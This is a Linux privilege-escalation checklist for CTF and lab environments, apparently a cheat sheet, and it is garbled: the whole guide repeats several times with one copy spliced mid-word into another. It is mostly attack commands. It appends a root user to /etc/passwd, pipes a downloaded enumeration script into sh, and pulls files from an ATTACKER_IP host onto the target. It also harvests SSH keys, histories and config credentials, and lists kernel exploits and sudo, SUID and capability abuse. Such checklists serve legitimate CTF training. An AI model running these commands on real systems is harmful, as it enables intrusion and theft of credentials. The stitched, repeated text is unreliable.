# Privilege Escalation Workflow & Checklist

## Phase 1: Initial Access & Stabilization

### [ ] Shell Stabilization / Interactive (if from RCE)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z then:
stty raw -echo; fg
```

### [ ] Basic Orientation

```bash
whoami
id
pwd
hostname
cat /etc/os-release
uname -a
```

**Tips:**

- Note your current user and groups
- Save kernel version for exploit searching later
- Check if you're in docker: `cat /proc/1/cgroup`

---

## Phase 2: Low-Hanging Fruit (Quick Wins)

### [ ] Sudo Permissions (PRIORITY #1)

```bash
sudo -l
```

**Tips:**

- If ANY command shows (ALL) NOPASSWD → immediate win
- Check GTFOBins for the allowed command
- Common exploitable: vim, nano, find, awk, python, less, more, iftop, apt-get

### [ ] SUID/SGID Binaries (PRIORITY #2)

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null  # SGID
```

**Tips:**

- Focus on non-standard binaries (not /bin/su, /bin/mount, etc.)
- Custom binaries in /opt, /usr/local/bin are goldmines
- Check GTFOBins for each binary
- Run `strings` on suspicious binaries

### [ ] Writable /etc/passwd

```bash
ls -la /etc/passwd
```

**Tips:**

- If writable, generate password hash and add root user:

```bash
openssl passwd -1 -salt salt password123
echo 'newroot:$1$salt$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

---

## Phase 3: Automated Enumeration

### [ ] Run Enumeration Scripts

```bash
# LinPEAS (recommended)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or upload manually
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Alternative tools:**

- LinEnum
- Linux Smart Enumeration (lse.sh)
- Unix-privesc-check

**Tips:**

- Look for RED/YELLOW highlights in LinPEAS output
- Save output to file: `./linpeas.sh | tee linpeas_output.txt`
- Review carefully, don't just run and ignore

---

## Phase 4: Manual Enumeration

### [ ] User Information

```bash
cat /etc/passwd
cat /etc/group
last
w
who
```

### [ ] Home Directories

```bash
ls -la /home/
ls -la /home/*
cat /home/*/.bash_history
cat /home/*/.bashrc
find /home -type f -name "*.txt" 2>/dev/null
```

**Tips:**

- Look for passwords, SSH keys, notes
- Check for readable backup files (.bak, .old)

### [ ] Cronjobs & Timers

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*
systemctl list-timers
```

**Tips:**

- Check if cronjob scripts are writable
- Look for PATH hijacking opportunities
- Check for wildcard injection in scripts

### [ ] Writable Files & Directories

```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

### [ ] Capabilities

```bash
getcap -r / 2>/dev/null
```

**Tips:**

- cap_setuid+ep = instant root (python, perl, etc.)
- Check GTFOBins for capability abuse

### [ ] Services & Processes

```bash
ps aux
ps aux | grep root
netstat -tulpn
ss -tulpn
```

**Tips:**

- Look for services running as root
- Check for vulnerable versions

---

## Phase 5: Credentials & Sensitive Files

### [ ] Search for Passwords

```bash
grep -r "password" /var/www/html 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -i "pass"
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
```

### [ ] Database Files

```bash
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
```

### [ ] SSH Keys

```bash
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
cat /home/*/.ssh/id_rsa
```

### [ ] Log Files

```bash
cat /var/log/syslog
cat /var/log/auth.log
find /var/log -type f -exec ls -la {} \; 2>/dev/null
```

---

## Phase 6: Kernel & System Exploits

### [ ] Kernel Version Check

```bash
uname -a
cat /proc/version
```

### [ ] Search for Exploits

```bash
searchsploit kernel [version]
# Or Google: "kernel [version] privilege escalation exploit"
```

**Common exploits:**

- DirtyCow (CVE-2016-5195) - kernel < 4.8.3
- DirtyPipe (CVE-2022-0847) - kernel 5.8 - 5.17
- PwnKit (CVE-2021-4034) - pkexec

**Tips:**

- Compile exploits on your local machine
- Transfer binary to target
- Check GLIBC version compatibility: `ldd --version`

---

## Phase 7: Advanced Vectors

### [ ] Docker Escape

```bash
docker ps
docker images
find / -name docker.sock 2>/dev/null
cat /proc/1/cgroup
```

### [ ] NFS Shares

```bash
cat /etc/exports
showmount -e localhost
```
# Privilege Escalation Workflow & Checklist

## Phase 1: Initial Access & Stabilization

### [ ] Shell Stabilization / Interactive (if from RCE)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z then:
stty raw -echo; fg
```

### [ ] Basic Orientation

```bash
whoami
id
pwd
hostname
cat /etc/os-release
uname -a
```

**Tips:**

- Note your current user and groups
- Save kernel version for exploit searching later
- Check if you're in docker: `cat /proc/1/cgroup`

---

## Phase 2: Low-Hanging Fruit (Quick Wins)

### [ ] Sudo Permissions (PRIORITY #1)

```bash
sudo -l
```

**Tips:**

- If ANY command shows (ALL) NOPASSWD → immediate win
- Check GTFOBins for the allowed command
- Common exploitable: vim, nano, find, awk, python, less, more, iftop, apt-get

### [ ] SUID/SGID Binaries (PRIORITY #2)

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null  # SGID
```

**Tips:**

- Focus on non-standard binaries (not /bin/su, /bin/mount, etc.)
- Custom binaries in /opt, /usr/local/bin are goldmines
- Check GTFOBins for each binary
- Run `strings` on suspicious binaries

### [ ] Writable /etc/passwd

```bash
ls -la /etc/passwd
```

**Tips:**

- If writable, generate password hash and add root user:

```bash
openssl passwd -1 -salt salt password123
echo 'newroot:$1$salt$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

---

## Phase 3: Automated Enumeration

### [ ] Run Enumeration Scripts

```bash
# LinPEAS (recommended)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or upload manually
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Alternative tools:**

- LinEnum
- Linux Smart Enumeration (lse.sh)
- Unix-privesc-check

**Tips:**

- Look for RED/YELLOW highlights in LinPEAS output
- Save output to file: `./linpeas.sh | tee linpeas_output.txt`
- Review carefully, don't just run and ignore

---

## Phase 4: Manual Enumeration

### [ ] User Information

```bash
cat /etc/passwd
cat /etc/group
last
w
who
```

### [ ] Home Directories

```bash
ls -la /home/
ls -la /home/*
cat /home/*/.bash_history
cat /home/*/.bashrc
find /home -type f -name "*.txt" 2>/dev/null
```

**Tips:**

- Look for passwords, SSH keys, notes
- Check for readable backup files (.bak, .old)

### [ ] Cronjobs & Timers

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*
systemctl list-timers
```

**Tips:**

- Check if cronjob scripts are writable
- Look for PATH hijacking opportunities
- Check for wildcard injection in scripts

### [ ] Writable Files & Directories

```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

### [ ] Capabilities

```bash
getcap -r / 2>/dev/null
```

**Tips:**

- cap_setuid+ep = instant root (python, perl, etc.)
- Check GTFOBins for capability abuse

### [ ] Services & Processes

```bash
ps aux
ps aux | grep root
netstat -tulpn
ss -tulpn
```

**Tips:**

- Look for services running as root
- Check for vulnerable versions

---

## Phase 5: Credentials & Sensitive Files

### [ ] Search for Passwords

```bash
grep -r "password" /var/www/html 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -i "pass"
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
```

### [ ] Database Files

```bash
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
```

### [ ] SSH Keys

```bash
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
cat /home/*/.ssh/id_rsa
```

### [ ] Log Files

```bash
cat /var/log/syslog
cat /var/log/auth.log
find /var/log -type f -exec ls -la {} \; 2>/dev/null
```

---

## Phase 6: Kernel & System Exploits

### [ ] Kernel Version Check

```bash
uname -a
cat /proc/version
```

### [ ] Search for Exploits

```bash
searchsploit kernel [version]
# Or Google: "kernel [version] privilege escalation exploit"
```

**Common exploits:**

- DirtyCow (CVE-2016-5195) - kernel < 4.8.3
- DirtyPipe (CVE-2022-0847) - kernel 5.8 - 5.17
- PwnKit (CVE-2021-4034) - pkexec

**Tips:**

- Compile exploits on your local machine
- Transfer binary to target
- Check GLIBC version compatibility: `ldd --version`

---

## Phase 7: Advanced Vectors

### [ ] Docker Escape

```bash
docker ps
docker images
find / -name docker.sock 2>/dev/null
cat /proc/1/cgroup
```

### [ ] NFS Shares

```bash
cat /etc/exports
showmount -e localhost
```

**Tips:**

- no_root_squash = root access

### [ ] Path Hijacking

```bash
echo $PATH
find / -perm -o+w -type d 2>/dev/null  # writable dirs in PATH
```

### [ ] LD_PRELOAD/LD_LIBRARY_PATH

```bash
sudo -l  # check for env_keep
ldd /path/to/binary
```

### [ ] Python Library Hijacking

```bash
python3 -c "import sys; print('\n'.join(sys.path))"
# Check if any paths are writable
```

---

## Phase 8: Binary Analysis (Custom Binaries)

### [ ] Analyze Suspicious Binaries

```bash
file /path/to/binary
strings /path/to/binary
ltrace /path/to/binary
strace /path/to/binary
```

**Tips:**

- Look for hardcoded credentials
- Check for command injection opportunities
- Test buffer overflows if binary reads user input

---

## Quick Reference Checklist

**Immediate priorities (in order):**

1.  `sudo -l` → GTFOBins
2.  SUID binaries → GTFOBins
3.  Writable /etc/passw# Privilege Escalation Workflow & Checklist

## Phase 1: Initial Access & Stabilization

### [ ] Shell Stabilization / Interactive (if from RCE)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z then:
stty raw -echo; fg
```

### [ ] Basic Orientation

```bash
whoami
id
pwd
hostname
cat /etc/os-release
uname -a
```

**Tips:**

- Note your current user and groups
- Save kernel version for exploit searching later
- Check if you're in docker: `cat /proc/1/cgroup`

---

## Phase 2: Low-Hanging Fruit (Quick Wins)

### [ ] Sudo Permissions (PRIORITY #1)

```bash
sudo -l
```

**Tips:**

- If ANY command shows (ALL) NOPASSWD → immediate win
- Check GTFOBins for the allowed command
- Common exploitable: vim, nano, find, awk, python, less, more, iftop, apt-get

### [ ] SUID/SGID Binaries (PRIORITY #2)

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null  # SGID
```

**Tips:**

- Focus on non-standard binaries (not /bin/su, /bin/mount, etc.)
- Custom binaries in /opt, /usr/local/bin are goldmines
- Check GTFOBins for each binary
- Run `strings` on suspicious binaries

### [ ] Writable /etc/passwd

```bash
ls -la /etc/passwd
```

**Tips:**

- If writable, generate password hash and add root user:

```bash
openssl passwd -1 -salt salt password123
echo 'newroot:$1$salt$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

---

## Phase 3: Automated Enumeration

### [ ] Run Enumeration Scripts

```bash
# LinPEAS (recommended)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or upload manually
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Alternative tools:**

- LinEnum
- Linux Smart Enumeration (lse.sh)
- Unix-privesc-check

**Tips:**

- Look for RED/YELLOW highlights in LinPEAS output
- Save output to file: `./linpeas.sh | tee linpeas_output.txt`
- Review carefully, don't just run and ignore

---

## Phase 4: Manual Enumeration

### [ ] User Information

```bash
cat /etc/passwd
cat /etc/group
last
w
who
```

### [ ] Home Directories

```bash
ls -la /home/
ls -la /home/*
cat /home/*/.bash_history
cat /home/*/.bashrc
find /home -type f -name "*.txt" 2>/dev/null
```

**Tips:**

- Look for passwords, SSH keys, notes
- Check for readable backup files (.bak, .old)

### [ ] Cronjobs & Timers

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*
systemctl list-timers
```

**Tips:**

- Check if cronjob scripts are writable
- Look for PATH hijacking opportunities
- Check for wildcard injection in scripts

### [ ] Writable Files & Directories

```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

### [ ] Capabilities

```bash
getcap -r / 2>/dev/null
```

**Tips:**

- cap_setuid+ep = instant root (python, perl, etc.)
- Check GTFOBins for capability abuse

### [ ] Services & Processes

```bash
ps aux
ps aux | grep root
netstat -tulpn
ss -tulpn
```

**Tips:**

- Look for services running as root
- Check for vulnerable versions

---

## Phase 5: Credentials & Sensitive Files

### [ ] Search for Passwords

```bash
grep -r "password" /var/www/html 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -i "pass"
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
```

### [ ] Database Files

```bash
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
```

### [ ] SSH Keys

```bash
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
cat /home/*/.ssh/id_rsa
```

### [ ] Log Files

```bash
cat /var/log/syslog
cat /var/log/auth.log
find /var/log -type f -exec ls -la {} \; 2>/dev/null
```

---

## Phase 6: Kernel & System Exploits

### [ ] Kernel Version Check

```bash
uname -a
cat /proc/version
```

### [ ] Search for Exploits

```bash
searchsploit kernel [version]
# Or Google: "kernel [version] privilege escalation exploit"
```

**Common exploits:**

- DirtyCow (CVE-2016-5195) - kernel < 4.8.3
- DirtyPipe (CVE-2022-0847) - kernel 5.8 - 5.17
- PwnKit (CVE-2021-4034) - pkexec

**Tips:**

- Compile exploits on your local machine
- Transfer binary to target
- Check GLIBC version compatibility: `ldd --version`

---

## Phase 7: Advanced Vectors

### [ ] Docker Escape

```bash
docker ps
docker images
find / -name docker.sock 2>/dev/null
cat /proc/1/cgroup
```

### [ ] NFS Shares

```bash
cat /etc/exports
showmount -e localhost
```

**Tips:**

- no_root_squash = root access

### [ ] Path Hijacking

```bash
echo $PATH
find / -perm -o+w -type d 2>/dev/null  # writable dirs in PATH
```

### [ ] LD_PRELOAD/LD_LIBRARY_PATH

```bash
sudo -l  # check for env_keep
ldd /path/to/binary
```

### [ ] Python Library Hijacking

```bash
python3 -c "import sys; print('\n'.join(sys.path))"
# Check if any paths are writable
```

---

## Phase 8: Binary Analysis (Custom Binaries)

### [ ] Analyze Suspicious Binaries

```bash
file /path/to/binary
strings /path/to/binary
ltrace /path/to/binary
strace /path/to/binary
```

**Tips:**

- Look for hardcoded credentials
- Check for command injection opportunities
- Test buffer overflows if binary reads user input

---

## Quick Reference Checklist

**Immediate priorities (in order):**

1. ✅ `sudo -l` → GTFOBins
2. ✅ SUID binaries → GTFOBins
3. ✅ Writable /etc/passwd
4. ✅ Cronjobs with writable scripts
5. ✅ Capabilities (cap_setuid)
6. ✅ Kernel exploits
7. ✅ Credentials in files/history
8. ✅ Docker/container escape

**CTF-Specific Tricks:**

- Password reuse is common
- Check /opt and /usr/local for custom binaries
- Read ALL .txt files in accessible directories
- Try default credentials (admin:admin, root:root)
- Look for hints in file names and directory structure

**File Transfer Methods:**

```bash
# HTTP Server (attacker)
python3 -m http.server 8000

# Target download
wget http://ATTACKER_IP:8000/file
curl http://ATTACKER_IP:8000/file -o file

# Base64 (for small files)
base64 -w0 file  # on attacker
echo "BASE64STRING" | base64 -d > file  # on target
```

This workflow should cover 95% of CTF privilege escalation scenarios. Start from Phase 1 and work your way down systematically

## Legal Disclaimer

This guide is intended for **educational purposes and authorized CTF/lab environments only**. 

- Only use these techniques on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal in most jurisdictions
- The author assumes no liability for misuse of this information
- Always obtain proper authorization before performing security testing

**USE RESPONSIBLY AND ETHICALLY.**d
4.  Cronjobs with writable scripts
5.  Capabilities (cap_setuid)
6.  Kernel exploits
7.  Credentials in files/history
8.  Docker/container escape

**CTF-Specific Tricks:**

- Password reuse is common
- Check /opt and /usr/local for custom binaries
- Read ALL .txt files in accessible directories
- Try default credentials (admin:admin, root:root)
- Look for hints in file names and directory structure

**File Transfer Methods:**

```bash
# HTTP Server (attacker)
python3 -m http.server 8000

# Target download
wget http://ATTACKER_IP:8000/file
curl http://ATTACKER_IP:8000/file -o file

# Base64 (for small files)
base64 -w0 file  # on attacker
echo "BASE64STRING" | base64 -d > file  # on target
```

This workflow should cover 95% of CTF privilege escalation scenarios. Start from Phase 1 and work your way down systematically

## Legal Disclaimer

This guide is intended for **educational purposes and authorized CTF/lab environments only**. 

- Only use these techniques on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal in most jurisdictions
- The author assumes no liability for misuse of this information
- Always obtain proper authorization before performing security testing

**USE RESPONSIBLY AND ETHICALLY.**
**Tips:**

- no_root_squash = root access

### [ ] Path Hijacking

```bash
echo $PATH
find / -perm -o+w -type d 2>/dev/null  # writable dirs in PATH
```

### [ ] LD_PRELOAD/LD_LIBRARY_PATH

```bash
sudo -l  # check for env_keep
ldd /path/to/binary
```

### [ ] Python Library Hijacking

```bash
python3 -c "import sys; print('\n'.join(sys.path))"
# Check if any paths are writable
```

---

## Phase 8: Binary Analysis (Custom Binaries)

### [ ] Analyze Suspicious Binaries

```bash
file /path/to/binary
strings /path/to/binary
ltrace /path/to/binary
strace /path/to/binary
```

**Tips:**

- Look for hardcoded credentials
- Check for command injection opportunities
- Test buffer overflows if binary reads user input

---

## Quick Reference Checklist

**Immediate priorities (in order):**

1.  `sudo -l` → GTFOBins
2.  SUID binaries → GTFOBins
3.  Writable /etc/passwd
4.  Cronjobs with writable scripts
5.  Capabilities (cap_setuid)
6.  Kernel exploits
7.  Credentials in files/history
8.  Docker/container escape

**CTF-Specific Tricks:**

- Password reuse is common
- Check /opt and /usr/local for custom binaries
- Read ALL .txt files in accessible directories
- Try default credentials (admin:admin, root:root)
- Look for hints in file names and directory structure

**File Transfer Methods:**

```bash
# HTTP Server (attacker)
python3 -m http.server 8000

# Target download
wget http://ATTACKER_IP:8000/file
curl http://ATTACKER_IP:8000/file -o file

# Base64 (for small files)
base64 -w0 file  # on attacker
echo "BASE64STRING" | base64 -d > file  # on target
```

This workflow should cover 95% of CTF privilege escalation scenarios. Start from Phase 1 and work your way down systematically

## Legal Disclaimer

This guide is intended for **educational purposes and authorized CTF/lab environments only**. 

- Only use these techniques on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal in most jurisdictions
- The author assumes no liability for misuse of this information
- Always obtain proper authorization before performing security testing

**USE RESPONSIBLY AND ETHICALLY.**
